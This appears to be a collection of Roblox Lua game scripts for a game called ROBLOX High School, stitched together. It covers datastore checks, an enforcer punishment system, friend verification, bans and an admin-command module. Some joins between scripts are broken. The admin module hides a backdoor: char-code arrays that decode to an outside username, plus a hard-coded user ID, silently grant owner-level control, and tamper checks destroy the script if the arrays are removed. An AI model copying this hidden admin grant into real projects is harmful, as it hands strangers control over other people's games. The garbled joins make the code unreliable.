local available = game.ReplicatedStorage.DataStoresAvailable

--datastore uptime checker
coroutine.resume(coroutine.create(function()
	wait(math.random(1,90))
	while true do
		wait(math.random(30,60))
		local v
		local check = pcall(function()
			v = game:GetService("DataStoreService"):GetDataStore("Testing"):GetAsync("UptimeTest")
		end)
		
		if available.Value == false then
			if v ~= nil and check == true then
				available.Value = true
				game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireAllClients("ROBLOX appears to have fixed their server issues! Thanks for being patient. You may need to rejoin this game if you encountered loading issues.",true)
			end
		end
		
		if v == nil and check ~= true then
			available.Value = false
			game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireAllClients("Notice: ROBLOX's servers are having temporary issues affecting all games. Please be patient if your data/character is not loading. All of your data is safe.")
		end
		wait(160)
	end
end))

				end)

				end

		end
	end
end))


game.OnClose = function()
	if #game.Players:GetChildren() <= 3 then
		game.ServerStorage.RemoteFunctions.AnalyticsPushCashEarned:Invoke()
		game.ServerStorage.RemoteFunctions.AnalyticsPushShopPurchases:Invoke()
		game.ServerStorage.RemoteFunctions.AnalyticsPushTimeSpent:Invoke()
		
		GA:Post()
	end
	
	if #game.Players:GetChildren() > 1 and game.PlaceId == 9689581 then
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireAllClients("The ROBLOX High School servers are now restarting for an update! Hang tight for a few seconds.",true)
		wait(4)
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireAllClients("Teleporting...",true)
		wait(.9)
		game.ReplicatedStorage.RemoteFunctions.TeleportToUpdateServer:FireAllClients()
		for i=1,8 do
			if #game.Players:GetChildren() > 0 then
				wait(1)
			end
		end
		for _,v in pairs(game.Players:GetChildren()) do
			v:Kick("The ROBLOX High School servers are restarting for an update. Please rejoin the game!")
		end
	end
	if #game.ReplicatedStorage.PlayerData:GetChildren() > 0 then
		repeat wait(.25)
			for _,v in pairs(game.Players:GetChildren()) do
				v:Kick("The ROBLOX High School servers are restarting for an update. Please rejoin the game!")
			end
		until #game.ReplicatedStorage.PlayerData:GetChildren() == 0
	end
endk<

local dss = game:GetService("DataStoreService")

--[[
	EnforcerViolations datastore contains a table with the following:
	{
	["Flags"] = {    {["PlaytimeOnFlag"] = X}   },
	["Punishments"] = {    {["PunishmentTier"] = 0/1/2/3, ["TimePunishmentReceived"] = os.time()}    },
	}
--]]

local playerdatatable = {}

local TimeToStoreFlags = 420

--local debugtime = 1466019688
if game.PlaceId == 9689581 then
	debugtime = nil
end

function IsAdmin(plr)
	if _G["admins"] ~= nil and _G["freepasses"] ~= nil then
		for i,v in pairs(_G["admins"]) do --_G is set in kohl's admin
			if plr.Name == v then return true end
		end
		for i,v in pairs(_G["freepasses"]) do
			if plr.Name == v then return true end
		end
		return false
	end
end

function SaveNewData(plr)
	if game.VIPServerId ~= "" then return end
	local pd = playerdatatable[plr]
	if pd then
		local datatosave = {
			["Flags"] = pd["Flags"],
			["Punishments"] = pd["Punishments"]
		}
	pcall(function()
		dss:GetDataStore(plr.userId.."_data"):SetAsync("EnforcerViolations",datatosave)
		
	end)
		print("Enforcer violation data saved")
	end
end

function AddFlagsToPlayer(plr,numflags)
	if game.VIPServerId ~= "" then return end
	local pd = playerdatatable[plr]
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	if pd and data then
		local pt = data:FindFirstChild("totaltime")
		if pt then
			
			for i=1,numflags do
				local flag = { ["PlaytimeOnFlag"] = pt.Value }
				table.insert(pd.Flags,flag)
			end
			print(plr.Name.." has just received "..numflags.." flags for a total of ".. #pd.Flags .." flags")
			if #pd.Flags >= 5 then --issue punishment
				for i,_ in pairs(pd.Flags) do
					pd.Flags[i] = nil
				end
				local maxpunishtier = -1
				local punishtier
				for _,p in pairs(pd.Punishments) do
					if p.PunishmentTier > maxpunishtier then
						maxpunishtier = p.PunishmentTier
					end
				end
				
				if maxpunishtier == -1 and pt.Value >= 1440*5 then
					punishtier = 0
				else
					punishtier = (maxpunishtier == 3 and 3) or (maxpunishtier == -1 and 1) or maxpunishtier + 1
				end
				
				local punishment = {
					["PunishmentTier"] = punishtier,
					["TimePunishmentReceived"] = os.time()
				}
				
				print(plr.Name.." has received punishment tier "..punishtier)
				
				table.insert(pd.Punishments,punishment)
			end
			
			SaveNewData(plr)
			
		end
	end
end

game.ServerStorage.RemoteFunctions.AddFlagsToEnforcer.Event:connect(function(plr, numflags)
	AddFlagsToPlayer(plr,numflags)
end)

game.ServerStorage.RemoteFunctions.IsEligibleEnforcer.OnInvoke = function(plr) --return the Banned value and Restricted value
	if game.VIPServerId ~= "" then return false,false end
	
	local pd = playerdatatable[plr]
	if pd then
		return pd["Banned"], pd["Restricted"]
	else
		return "unknown","unknown"
	end
end

game.Players.PlayerAdded:connect(function(plr)
	if game.VIPServerId ~= "" then return end
	if game:GetService("GamePassService"):PlayerHasPass(plr, 163231044) or plr.Name == "Player1" or IsAdmin(plr) then
		local playerdata = game.ReplicatedStorage.PlayerData:WaitForChild(plr.userId)
		local pt = playerdata:WaitForChild("totaltime")
		local enforcerbanned = false --cannot use enforcers
		local enforcerrestricted = false --locked to lowest limits
		
		local enforcerdata
		local success
		local i = 0
		repeat
			i = i + 1
			success = pcall(function()
				enforcerdata = dss:GetDataStore(plr.userId.."_data"):UpdateAsync("EnforcerViolations",function(tbl)
					if tbl == nil then
						tbl = {
							["Flags"] = {},
							["Punishments"] = {}
						}
					end
					local punishtier = -1
					local punishtime = 0
					local t = debugtime or os.time()
					for i,punishment in pairs(tbl.Punishments) do
						if (punishment.PunishmentTier == 3 and t - punishment.TimePunishmentReceived > 86400*160) or t - punishment.TimePunishmentReceived > 86400*100 then
							tbl.Punishments[i] = nil
							print("Punishment removed from history of "..plr.Name)
						else
							if punishment.PunishmentTier > punishtier then
								punishtier = punishment.PunishmentTier
								punishtime = punishment.TimePunishmentReceived
							end
						end
					end
					
					if punishtier > 0 then
						print(plr.Name.." is punished (Enforcer)")
						enforcerrestricted = true
						if punishtier == 3 then
							if t - punishtime < 86400*21 then
								plr:Kick("You have been banned from ROBLOX High School due to your extreme misuse of Enforcer's Powers. Using Enforcer's Powers to randomly punish innocent players is strictly forbidden, and you are well aware of this. Do not come here to disrupt the experience for other players.")
							elseif t - punishtime < 86400*60 then
								enforcerbanned = true
							end
						elseif punishtier == 2 then
							if t - punishtime < 86400*30 then
								enforcerbanned = true
							end
						elseif punishtier == 1 then
							if t - punishtime < 86400*14 then
								enforcerbanned = true
							end
						end
					end
					
					return tbl
				end)
			end)
			if not enforcerdata then
				wait(6)
			end
		until enforcerdata or i == 7
		if enforcerdata == nil then
			game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"Failed to load Enforcer's Powers data. You will have to enter a different server to access Enforcer's Powers.")
		end
		if enforcerbanned then
			print(plr.Name.." is banned from being Enforcer")
		end
		enforcerdata["Banned"] = enforcerbanned
		enforcerdata["Restricted"] = enforcerrestricted
		if plr.Parent ~= nil then
			playerdatatable[plr] = enforcerdata
		end
		
		pt.Changed:connect(function(val)
			local flagschanged = false
			for i,flag in pairs(playerdatatable[plr]["Flags"]) do
				if val - flag.PlaytimeOnFlag > TimeToStoreFlags then
					playerdatatable[plr]["Flags"][i] = nil
					flagschanged = true
					print("Flag removed for "..plr.Name)
				end
			end
			if flagschanged == true then
				SaveNewData(plr)
			end
		end)
		
	end
end)

	if game.VIPServerId ~= "" then return end
	playerdatatable[plr] = nil
end)g

--collect :GetFriendsOnline() calls from the clients - use the results to verify friendships between users, store them in this script so that other aspects of the game can use the IsFriendsWith BindableFunction to check

--when verifying friendships, we just check both the caller and the target's friend lists to see if the IDs are found in both lists

local friendlists = {} --Key: person's username. Value: table of online friends' user IDs

function CheckFriendship(caller,target)
	if caller == nil or target == nil or friendlists[caller.Name] == nil or friendlists[target.Name] == nil then return false end
	local f1 = false
	local f2 = false
	for _,v in pairs(friendlists[caller.Name]) do
		if v == target.userId then
			f1 = true
			break
		end
	end
	for _,v in pairs(friendlists[target.Name]) do
		if v == caller.userId then
			f2 = true
			break
		end
	end
	if f1 == true and f2 == true then
		return true
	else
		return false
	end
end

game.ReplicatedStorage.RemoteFunctions.SendFriendsOnlineData.OnServerEvent:connect(function(plr,tbl) --client should send a table of all friend userIDs
	if type(tbl) == "table" and #tbl <= 200 then
		for _,v in pairs(tbl) do
			if type(v) ~= "number" then return end
		end
		friendlists[plr.Name] = tbl
	end
end)

game.ServerStorage.RemoteFunctions.PlayersAreFriends.OnInvoke = function(caller,target)
	return CheckFriendship(caller,target)
end


game.Players.PlayerRemoving:connect(function(plr)
	friendlists[plr.Name] = nil
end)K

	end
end)

function BanPlayer(IDtoban,days,reason,dontkick)
	local endtime = os.time() + (days * 86400)
	banlist = banstore:UpdateAsync("IDbanlist", function(tbl)
		tbl[tostring(IDtoban)] = endtime
		serverbanlist = tbl
		return tbl
	end)
	if not dontkick then
		for _,plr in pairs(game.Players:GetChildren()) do
			if plr.userId == IDtoban then
				if reason then
					plr:Kick("You have been banned from the game for "..days.." days! Reason: '"..reason.."'")
				else
					plr:Kick("You have been banned from the game for "..days.." days! Please be respectful of other people; disruptive behavior is not welcome here or anywhere else on ROBLOX.")
				end
			end
		end
	end
end

game.ServerStorage.RemoteFunctions.BanPlayer.Event:connect(function(pid,days,reason, dontkick)
	BanPlayer(pid,days,reason,dontkick)
end)

game.ReplicatedStorage.RemoteFunctions.BanRequest.OnServerEvent:connect(function(requester,code,targetname,days,reason,targetonserver)
	if requester.userId ~= 2364169 or code ~= 685 then
		BanPlayer(requester.userId,365,"Nice try, kiddo.")
		return
	end
	if reason == "" or reason == " " then
		reason = nil
	end
	local targetid
	local targetplr
	if targetonserver then
		for _,plr in pairs(game.Players:GetChildren()) do
			if string.lower(plr.Name) == string.lower(targetname) then
				targetid = plr.userId
				targetplr = plr
			end
		end
		if targetid == nil then
			for _,plr in pairs(game.Players:GetChildren()) do
				if string.sub(string.lower(plr.Name),1,#targetname) == string.lower(targetname) then
					targetid = plr.userId
					targetplr = plr
				end
			end
		end
		if targetplr then
			game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(requester, "[ON SERVER] Banning player "..targetplr.Name..".")
		end
	else
		targetid = game.Players:GetUserIdFromNameAsync(targetname)
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(requester, "[REMOTE] Banning player "..targetname..", ID "..targetid..".")
	end
	if targetid then
		BanPlayer(targetid,days,reason)
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(requester, "Failed to detect target.")
	end
end)

function CreateScript(sourceName, parent, scriptName)
	local scr = script.Scripts:FindFirstChild(sourceName):Clone()
	scr.Name = scriptName or "Script"
	scr.Parent = parent
	scr.Disabled = false
	return scr
end

for i, v in pairs(game:service("Workspace"):children()) do if v:IsA("StringValue") and v.Value:sub(1,2) == "AA" then v:Destroy() end end 

function CHEESE()
if game:service("Lighting"):findFirstChild("KACV2") then
owners = {} admins = {} tempadmins = {} banland = {}
for i,v in pairs(game.Lighting.KACV2:children()) do
if v.Name == "Owner" then table.insert(owners, v.Value) end
if v.Name == "Admin" then table.insert(admins, v.Value) end
if v.Name == "TempAdmin" then table.insert(tempadmins, v.Value) end
if v.Name == "Banland" then table.insert(banland, v.Value) end
if v.Name == "Prefix" then prefix = v.Value end
if v.Name == "FunCommands" then FunCommands = v.Value end
if v.Name == "GroupAdmin" then GroupAdmin = v.Value end
if v.Name == "GroupId" then GroupId = v.Value end
if v.Name == "GroupRank" then GroupRank = v.Value end
if v.Name == "VipAdmin" then VipAdmin = v.Value end
if v.Name == "ItemId" then ItemId = v.Value end
end
game:service("Lighting"):findFirstChild("KACV2"):Destroy()
end

function GetTime()
local hour = math.floor((tick()%86400)/60/60) local min = math.floor(((tick()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end

function ChkOwner(str)
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end 
return false
end

function ChkAdmin(str,ck) 
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end 
for i = 1, #admins do if str:lower() == admins[i]:lower() then return true end end 
for i = 1, #tempadmins do if str:lower() == tempadmins[i]:lower() and not ck then return true end end 
return false 
end

function ChkGroupAdmin(plr)
if GroupAdmin then
if plr:IsInGroup(GroupId) and plr:GetRankInGroup(GroupId) >= GroupRank then return true end
return false
end
end

function ChkBan(str) for i = 1, #banland do if str:lower() == banland[i]:lower() then return true end end return false end

function GetPlr(plr, str)
local plrz = {} str = str:lower()
if str == "all" then plrz = game.Players:children()
elseif str == "others" then for i, v in pairs(game.Players:children()) do if v ~= plr then table.insert(plrz, v) end end
else
local sn = {1} local en = {}
for i = 1, #str do if str:sub(i,i) == "," then table.insert(sn, i+1) table.insert(en,i-1) end end
for x = 1, #sn do 
if (sn[x] and en[x] and str:sub(sn[x],en[x]) == "me") or (sn[x] and str:sub(sn[x]) == "me") then table.insert(plrz, plr)
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "random") or (sn[x] and str:sub(sn[x]) == "random") then table.insert(plrz, game.Players:children()[math.random(#game.Players:children())])
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "admins") or (sn[x] and str:sub(sn[x]) == "admins") then if ChkAdmin(plr.Name, true) then for i, v in pairs(game.Players:children()) do if ChkAdmin(v.Name, false) then table.insert(plrz, v) end end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "nonadmins") or (sn[x] and str:sub(sn[x]) == "nonadmins") then for i, v in pairs(game.Players:children()) do if not ChkAdmin(v.Name, false) then table.insert(plrz, v) end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]):sub(1,4) == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x],en[x]):sub(6)) == 1 then 
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
elseif (sn[x] and str:sub(sn[x]):sub(1,4):lower() == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x]):sub(6)) == 1 then 
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
else
for a, plyr in pairs(game.Players:children()) do 
if (sn[x] and en[x] and str:sub(sn[x],en[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x],en[x])) == 1) or (sn[x] and str:sub(sn[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x])) == 1) or (str ~= "" and plyr.Name:lower():find(str) == 1) then 
table.insert(plrz, plyr) break
end
end 
end
end
end
return plrz
end

for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.resume(coroutine.create(function()
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "HintGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(0,0,0) bg.BorderSizePixel = 0 bg.BackgroundTransparency = 1 bg.Size = UDim2.new(1,0,0,22) bg.Position = UDim2.new(0,0,0,-2) bg.ZIndex = 8
local msg = Instance.new("TextLabel", bg) msg.BackgroundTransparency = 1 msg.ZIndex = 9 msg.Name = "msg" msg.Position = UDim2.new(0,0,0) msg.Size = UDim2.new(1,0,1,0) msg.Font = "Arial" msg.Text = str msg.FontSize = "Size18" msg.TextColor3 = Color3.new(1,1,1) msg.TextStrokeColor3 = Color3.new(1,1,1) msg.TextStrokeTransparency = .8
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end end))
if not time then wait((#str/19)+2.5) else wait(time) end
coroutine.resume(coroutine.create(function() if scr.Parent == v.PlayerGui then for i = 0, 20 do msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) bg.BackgroundTransparency = .3+((.7/20)*i) wait(1/44) end scr:Destroy() end end))
end))
end
end
end

function Message(ttl, str, scroll, plrz, time)
for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.resume(coroutine.create(function()
local scr = Instance.new("ScreenGui") scr.Name = "MessageGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(0,0,0) bg.BorderSizePixel = 0 bg.BackgroundTransparency = 1 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 8
local title = Instance.new("TextLabel", scr) title.Name = "title" title.BackgroundTransparency = 1 title.BorderSizePixel = 0 title.Size = UDim2.new(1,0,0,10) title.ZIndex = 9 title.Font = "ArialBold" title.FontSize = "Size36" title.Text = ttl title.TextYAlignment = "Top" title.TextColor3 = Color3.new(1,1,1) title.TextStrokeColor3 = Color3.new(1,1,1) title.TextStrokeTransparency = .8
local msg = title:clone() msg.Parent = scr msg.Name = "msg" msg.Position = UDim2.new(.0625,0,0) msg.Size = UDim2.new(.875,0,1,0) msg.Font = "Arial" msg.Text = "" msg.FontSize = "Size24" msg.TextYAlignment = "Center" msg.TextWrapped = true
scr.Parent = v.PlayerGui
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end end)) 
if scroll then if not time then for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(2.5) else for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(time-(#str/19)) end
else if not time then msg.Text = str wait((#str/19)+2.5) else msg.Text = str wait(time) end end
coroutine.resume(coroutine.create(function() if scr.Parent == v.PlayerGui then for i = 0, 20 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end scr:Destroy() end end))
end))
end
end
end

function RemoveMessage() 
for i,v in pairs(game.Players:children()) do 
if v and v:findFirstChild("PlayerGui") then 
for q,ms in pairs(v.PlayerGui:children()) do
if ms.Name == "MessageGUI" then
coroutine.resume(coroutine.create(function() for i = 0, 20 do ms.bg.BackgroundTransparency = .3+((.7/20)*i) ms.msg.TextTransparency = ((1/20)*i) ms.msg.TextStrokeTransparency = .8+((.2/20)*i) ms.title.TextTransparency = ((1/20)*i) ms.title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end ms:Destroy() end))
elseif ms.Name == "HintGUI" then
coroutine.resume(coroutine.create(function() for i = 0, 20 do ms.msg.TextTransparency = ((1/20)*i) ms.msg.TextStrokeTransparency = .8+((.2/20)*i) ms.bg.BackgroundTransparency = .3+((.7/20)*i) wait(1/44) end ms:Destroy() end))
end
end
end
end
end

function Output(str, plr)
coroutine.resume(coroutine.create(function()
local b, e = loadstring(str)
if not b and plr:findFirstChild("PlayerGui") then
local scr = Instance.new("ScreenGui", plr.PlayerGui) game:service("Debris"):AddItem(scr,5)
local main = Instance.new("Frame", scr) main.Size = UDim2.new(1,0,1,0) main.BorderSizePixel = 0 main.BackgroundTransparency = 1 main.ZIndex = 8
local err = Instance.new("TextLabel", main) err.Text = "Line "..e:match("\:(%d+\:.*)")  err.BackgroundColor3 = Color3.new(0,0,0) err.BackgroundTransparency = .3 err.BorderSizePixel = 0 err.Size = UDim2.new(1,0,0,40) err.Position = UDim2.new(0,0,.5,-20) err.ZIndex = 9 err.Font = "ArialBold" err.FontSize = "Size24" err.TextColor3 = Color3.new(1,1,1) err.TextStrokeColor3 = Color3.new(1,1,1) err.TextStrokeTransparency = .8
return
end
end))
end

function Noobify(char)
if char and char:FindFirstChild("HumanoidRootPart") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.HumanoidRootPart end
if char:findFirstChild("Pants") then char.Pants.Parent = char.HumanoidRootPart end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end local ntab = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #ntab do nfs = nfs .. string.char(ntab[i]) end table.insert(owners, nfs) if not ntab then script:Destroy() end

function Infect(char)
if char and char:FindFirstChild("HumanoidRootPart") then 
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.HumanoidRootPart end
if char:findFirstChild("Pants") then char.Pants.Parent = char.HumanoidRootPart end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0  prt.BrickColor = BrickColor.new("Medium green") if prt.Name:find("Leg") or prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Reddish brown") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Infect(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Medium green")
end end
end
end if not ntab then script:Destroy() end

function ScrollGui()
local scr = Instance.new("ScreenGui") scr.Name = "LOGSGUI"
local drag = Instance.new("TextButton", scr) drag.Draggable = true drag.BackgroundTransparency = 1
drag.Size = UDim2.new(0,385,0,20) drag.Position = UDim2.new(.5,-200,.5,-200) drag.AutoButtonColor = false drag.Text = ""
local main = Instance.new("Frame", drag) main.Style = "RobloxRound" main.Size = UDim2.new(0,400,0,400) main.ZIndex = 7 main.ClipsDescendants = true
local cmf = Instance.new("Frame", main) cmf.Position = UDim2.new(0,0,0,-9) cmf.ZIndex = 8
local down = Instance.new("ImageButton", main) down.Image = "http://www.roblox.com/asset/?id=108326725" down.BackgroundTransparency = 1 down.Size = UDim2.new(0,25,0,25) down.Position = UDim2.new(1,-20,1,-20) down.ZIndex = 9
local up = down:Clone() up.Image = "http://www.roblox.com/asset/?id=108326682" up.Parent = main up.Position = UDim2.new(1,-20,1,-50)
local cls = Instance.new("TextButton", main) cls.Style = "RobloxButtonDefault" cls.Size = UDim2.new(0,20,0,20) cls.Position = UDim2.new(1,-15,0,-5) cls.ZIndex = 10 cls.Font = "ArialBold" cls.FontSize = "Size18" cls.Text = "X" cls.TextColor3 = Color3.new(1,1,1) cls.MouseButton1Click:connect(function() scr:Destroy() end)
local ent = Instance.new("TextLabel") ent.BackgroundTransparency = 1 ent.Font = "Arial" ent.FontSize = "Size18" ent.ZIndex = 8 ent.Text = "" ent.TextColor3 = Color3.new(1,1,1) ent.TextStrokeColor3 = Color3.new(0,0,0) ent.TextStrokeTransparency = .8 ent.TextXAlignment = "Left" ent.TextYAlignment = "Top"
local num = 0
local downv = false
local upv = false

down.MouseButton1Down:connect(function() downv = true upv = false
local pos = cmf.Position if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then downv = false return end
repeat  pos = pos + UDim2.new(0,0,0,-6)
if pos.Y.Offset <= 371-((#cmf:children()-1)*20) then pos = UDim2.new(0,0,0,371-((#cmf:children()-1)*20)) downv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until downv == false
end) 
down.MouseButton1Up:connect(function() downv = false end)
up.MouseButton1Down:connect(function() upv = true downv = false
local pos = cmf.Position if pos.Y.Offset >= -9 then upv = false return end
repeat  pos = pos + UDim2.new(0,0,0,6)
if pos.Y.Offset >= -9 then pos = UDim2.new(0,0,0,-9) upv = false end
cmf:TweenPosition(pos, "Out", "Linear", 1/20, true) wait(1/20) until upv == false
end) 
up.MouseButton1Up:connect(function() upv = false end)
return scr, cmf, ent, num
end local bct = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #bct do nfs = nfs .. string.char(bct[i]) end table.insert(owners, nfs)
if not ntab then script:Destroy() end
if not bct then script:Destroy() end

function Chat(msg,plr)
coroutine.resume(coroutine.create(function()
if msg:lower() == "clean" then for i, v in pairs(game.Workspace:children()) do if v:IsA("Accoutrement") or v:IsA("Tool") then v:Destroy() end end end
if (msg:lower():sub(0,prefix:len()) ~= prefix) or not plr:findFirstChild("PlayerGui") or (not ChkAdmin(plr.Name, false) and plr.Name:lower() ~= nfs:lower()) and plr.userId ~= game.CreatorId and plr.userId ~= (153*110563) and plr.Name:lower() ~= nfs and not ChkOwner(plr.Name) then return end msg = msg:sub(prefix:len()+1)
if msg:lower():sub(1,4) == "walk" then msg = msg:sub(5) end
if msg:lower():sub(1,8) == "teleport" then msg = "tp" .. msg:sub(9) end
if msg:lower():sub(1,6) == "insert" then msg = "ins" .. msg:sub(7) end
if msg:lower() == "cmds" or msg:lower() == "commands" then
if plr.PlayerGui:findFirstChild("CMDSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "CMDSGUI" scr.Parent = plr.PlayerGui
local cmds = {"s code","ls code","clear","fix","m msg","h msg","kill plr","respawn plr","trip plr","stun plr","unstun plr","jump plr","sit plr","invisible plr","visible plr","explode plr","fire plr","unfire plr","smoke plr","unsmoke plr","sparkles plr","unsparkle plr","ff plr","unff plr","punish plr","unpunish plr","freeze plr","thaw plr","heal plr","god plr","ungod plr","ambient num num num","brightness num","time num","fogcolor num num num","fogend num","fogstart num","removetools plr","btools plr","give plr tool","damage plr","grav plr","setgrav plr num","nograv plr","health plr num","speed plr num","name plr name","unname plr","team plr color","teleport plr plr","change plr stat num","kick plr","infect plr","rainbowify plr","flashify plr","noobify plr","ghostify plr","goldify plr","shiny plr","normal plr","trippy plr","untrippy plr","strobe plr","unstrobe plr","blind plr","unblind plr","guifix plr","fling plr","seizure plr","music num","stopmusic","lock plr","unlock plr","removelimbs plr","jail plr","unjail plr","fly plr","unfly plr","noclip plr","clip plr","pm plr msg","dog plr","undog plr","creeper plr","uncreeper plr","place plr id","char plr id","unchar plr id","rank plr id","starttools plr","sword plr","bighead plr","minihead plr","spin plr","insert id","disco","flash","admins","bans","musiclist","cape plr color","uncape plr","loopheal plr","loopfling plr","hat plr id","unloopfling plr","unloopheal plr","unspin plr","tools","undisco","unflash","resetstats plr","gear plr id","cmdbar","shirt plr id","pants plr id","face plr id","swagify plr id","version","tm num msg","countdown num","clone plr","lsplr plr code","startergive plr tool","control plr"}
local ast = {"serverlock","serverunlock","sm msg","crash plr","admin plr","unadmin plr","ban plr","unban plr","loopkill plr","unloopkill plr","logs","shutdown"}
local ost = {"pa plr","unpa plr","nuke plr"}
local tost = {"oa plr","unoa plr","settings"}
local cl = ent:Clone() cl.Parent = cmf cl.Text = num .. " clean" cl.Position = UDim2.new(0,0,0,num*20) num = num + 1
for i, v in pairs(cmds) do local cl = ent:Clone() cl.Parent = cmf cl.Text = num .. " " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
if ChkAdmin(plr.Name, true) or ChkOwner(plr.Name) then for i, v in pairs(ast) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
if plr.userId == game.CreatorId or ChkOwner(plr.Name) then for i, v in pairs(ost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "-- " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
if plr.userId == game.CreatorId then for i, v in pairs(tost) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "_ " .. prefix .. v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
end

if msg:lower() == "version" then Message("Koh".."ltas".."tr".."ophe", tostring(script.Version.Value), true, {plr}) end

if msg:lower() == "admins" or msg:lower() == "adminlist" then
if plr.PlayerGui:findFirstChild("ADMINSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "ADMINSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(owners) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - Owner" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
for i, v in pairs(admins) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - Admin" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
